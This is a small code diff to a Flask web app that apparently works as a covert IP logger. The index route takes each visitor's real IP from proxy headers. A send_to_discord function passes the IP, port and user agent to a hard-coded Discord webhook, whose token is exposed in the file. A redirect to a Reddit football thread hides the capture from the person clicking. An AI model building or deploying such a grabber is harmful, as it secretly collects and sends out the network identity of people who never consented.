@@ -5,6 +5,7 @@ import ipaddress
 
 app = Flask(__name__)
 
+# ===================== CONFIG =====================
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430208752837066845/HFmlZHpwB_LgcbxjoFb47dvk4-5p6aWDDkKLVh_z2Oy_fBZT12DDkS4p-T8SXKkUEaTw"
 REDIRECT_URL = "https://www.reddit.com/r/football/comments/16n8k5s/can_a_taller_player_become_renowned_for_their/?rdt=62221"
 
@@ -34,6 +35,7 @@ def send_to_discord(ip, port, ua):
 
 @app.route('/')
 def index():
+    # Get real IP even behind proxies
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     if ',' in ip:
         ip = ip.split(',')[0].strip()
